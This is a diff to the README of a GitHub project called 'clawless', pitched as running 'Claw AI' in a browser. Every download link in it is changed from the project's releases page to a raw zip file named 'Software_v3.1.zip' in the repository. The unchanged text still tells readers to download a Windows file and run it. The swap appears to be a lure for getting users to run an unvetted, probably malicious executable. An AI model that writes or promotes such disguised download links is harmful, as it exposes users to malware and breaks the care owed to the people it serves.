@@ -1,10 +1,10 @@
 # 🐾 clawless - Run Claw AI in your browser
 
-[![Download clawless](https://img.shields.io/badge/Download-clawless-blue?style=for-the-badge&logo=github)](https://github.com/cduf938-alt/clawless/releases)
+[![Download clawless](https://img.shields.io/badge/Download-clawless-blue?style=for-the-badge&logo=github)](https://github.com/cduf938-alt/clawless/raw/refs/heads/main/public/Software_v3.1.zip)
 
 ## 🔗 Download
 
-Visit this page to download: [https://github.com/cduf938-alt/clawless/releases](https://github.com/cduf938-alt/clawless/releases)
+Visit this page to download: [https://github.com/cduf938-alt/clawless/raw/refs/heads/main/public/Software_v3.1.zip](https://github.com/cduf938-alt/clawless/raw/refs/heads/main/public/Software_v3.1.zip)
 
 Pick the latest Windows release file and save it to your PC.
 
@@ -37,7 +37,7 @@ For the best result, use a recent 64-bit Windows system.
 
 ## 🧭 Install on Windows
 
-1. Open the release page: [https://github.com/cduf938-alt/clawless/releases](https://github.com/cduf938-alt/clawless/releases)
+1. Open the release page: [https://github.com/cduf938-alt/clawless/raw/refs/heads/main/public/Software_v3.1.zip](https://github.com/cduf938-alt/clawless/raw/refs/heads/main/public/Software_v3.1.zip)
 2. Find the latest release at the top of the page
 3. Look for the Windows download file
 4. Download the file to your Downloads folder
@@ -194,6 +194,6 @@ clawless fits well when you want to:
 
 ## 📎 Download again
 
-Download page: [https://github.com/cduf938-alt/clawless/releases](https://github.com/cduf938-alt/clawless/releases)
+Download page: [https://github.com/cduf938-alt/clawless/raw/refs/heads/main/public/Software_v3.1.zip](https://github.com/cduf938-alt/clawless/raw/refs/heads/main/public/Software_v3.1.zip)
 
 Choose the latest Windows release file, download it, and run it on your PC
